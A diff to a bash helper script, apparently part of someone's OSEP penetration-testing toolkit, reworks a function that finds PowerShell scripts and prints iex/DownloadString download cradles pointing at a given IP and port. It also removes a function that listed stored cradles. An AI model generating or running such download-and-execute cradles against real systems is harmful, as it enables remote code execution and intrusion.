@@ -243,38 +243,23 @@
                 fi
         }
 
-        echo -e "pscradles - get PowerShell download gradles - use pscradles | grep <cradle>"
-        function pscradles(){
-
-                RED='\033[0;31m'
-                NC='\033[0m' # No Color
-
-                if [ $# -eq 0 ];then
-                        cat ~/OSEP/iex-cradles.txt
-                else
-                        echo -e "${RED}pscradles - get PowerShell download gradles - use${NC}"
-                fi
-        }
-
-
-        echo -e "iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>"
+        echo -e "iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <PATH> <IP> <PORT>"
         function iexurls(){
                 RED='\033[0;31m'
                 NC='\033[0m' # No Color
 
-                if [ $# -eq 2 ];then
-                        IP=$1
-                        PORT=$2
-                        find /home/vagrant/OSEP -name "*.ps1" | while read SCRIPT_PATH 
+                if [ $# -eq 3 ];then
+                        WORKING_PATH=$1
+                        IP=$2
+                        PORT=$3
+                        find $WORKING_PATH -name "*.ps1" | while read SCRIPT_PATH 
                                 do
                                         DOWNLOAD_CRADLE="iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$SCRIPT_PATH'))"
                                         # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
-                                        echo "$DOWNLOAD_CRADLE" | sed "s/\/\/home\/vagrant\/OSEP//g"
-                                        # echo "$DOWNLOAD_CRADLE_OBFS"
-                                        echo "\n"
+                                        echo "$DOWNLOAD_CRADLE" | sed "s*$WORKING_PATH/**g"
                                 done
                 else
-                        echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>${NC}"
+                        echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <PATH> <IP> <PORT>${NC}"
                 fi
         }
 
